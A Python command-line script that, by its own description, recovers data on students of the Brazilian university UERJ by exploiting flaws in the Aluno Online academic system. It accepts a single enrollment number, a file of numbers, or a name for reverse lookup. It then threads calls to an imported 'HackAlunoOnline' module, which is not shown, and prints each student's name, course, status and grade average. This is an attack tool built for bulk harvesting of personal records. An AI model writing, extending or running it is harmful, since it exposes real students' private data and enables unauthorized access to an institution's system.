#!/usr/bin/python

from argparse import ArgumentParser
from hackalunoonline import HackAlunoOnline
from threading import Thread

# Programa para recuperar os dados de um aluno da UERJ atraves de sua matricula

def get_matriculas_by_name( name ):
	matriculas = []
	
	arquivoMatriculas = open( 'matriculas-2015.2.txt' , 'r' )

	with open( 'nomes-2015.2.txt' , 'r' ) as arquivoNomes:
		for index, line in enumerate( arquivoNomes ) :
			if name in line.lower():
				arquivoMatriculas.seek( index * 13 )
				matriculas.append( arquivoMatriculas.readline() )
		
	arquivoMatriculas.close()

	return matriculas

def get_data( matricula , verbose , uerjlinks ):
	hao = HackAlunoOnline( matricula , verbose , uerjlinks )
	print( hao )

def Main():
	parser = ArgumentParser( description = "Recupera informacoes de alunos da UERJ atraves de falhas do sistema academico Aluno Online" )
	
	parser.add_argument( 'matricula' , help = "Matricula do aluno" )

	parser.add_argument( '-i' , '--inputfile' , help = "Utilizar um arquivo contendo uma lista de matriculas com uma matricula por linha como entrada" , action = "store_true" )
	parser.add_argument( '-v' , '--verbose'   , help = "Saida com mais conteudo textual" , action = "store_true" )
	parser.add_argument( '-u' , '--uerjlinks' , help = "Links de pdfs da uerj (Em geral arquivos de classificacao no vestibular)" , action = "store_true" )
	parser.add_argument( '-r' , '--reverse'   , help = "Procura reversa -> busca matricula por nome (para alunos do IPRJ)" , action = "store_true" )
	
	args = parser.parse_args()

	matriculas = []

	if args.reverse:
		matriculas = get_matriculas_by_name( args.matricula.lower() )
	elif args.inputfile:
		file = open( args.matricula , 'r' )
		matriculas = file.readlines()
	else:
		matriculas.append( args.matricula )

	if ( not matriculas ):
		print( "Nao foram encontrados dados para esta matricula" )
	else:
		if ( not args.verbose ):
			print( "{0:12}\t{1:30}\t{2:20}\t{3:10}\t{4:2}\t{5:4}".format( "Matricula", "Nome", "Curso" , "Situacao" , "Periodo" , "CRA" ) )

		for matricula in matriculas:
			thread = Thread( target = get_data , args = ( matricula.strip( '\n' ) , args.verbose , args.uerjlinks ) )
			thread.start()

# End Main

if __name__ == '__main__':
	Main()